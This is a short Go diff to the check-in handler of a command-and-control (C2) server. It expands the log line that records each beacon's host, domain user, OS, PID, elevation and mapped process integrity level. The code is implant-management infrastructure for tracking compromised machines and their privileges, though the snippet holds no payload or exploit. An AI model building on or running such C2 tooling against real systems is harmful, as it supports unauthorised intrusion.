@@ -36,8 +36,22 @@ func (h *C2) Checkin(w http.ResponseWriter, r *http.Request) {
 	}
 	info.LastSeen = time.Now()
 	h.Store.Upsert(&info)
-	h.log().Printf("[C2] check-in  id=%-10d  host=%-20s  user=%s\\%s  elevated=%v",
-		info.BeaconID, info.Hostname, info.Domain, info.Username, info.IsElevated)
+	integ := "LOW"
+	switch {
+	case info.IntegrityLevel >= 0x6000:
+		integ = "SYSTEM"
+	case info.IntegrityLevel >= 0x3000:
+		integ = "HIGH"
+	case info.IntegrityLevel >= 0x2000:
+		integ = "MEDIUM"
+	}
+	elevated := ""
+	if info.IsElevated {
+		elevated = " (elevated)"
+	}
+	h.log().Printf("[C2] check-in  id=%-12d  %s\\%s @ %s%s  %s  %s  pid=%-6d  %s  eip=%s",
+		info.BeaconID, info.Domain, info.Username, info.Hostname, elevated,
+		info.OsVersion, info.Arch, info.PID, integ, info.EIP)
 	w.WriteHeader(http.StatusOK)
 }
 
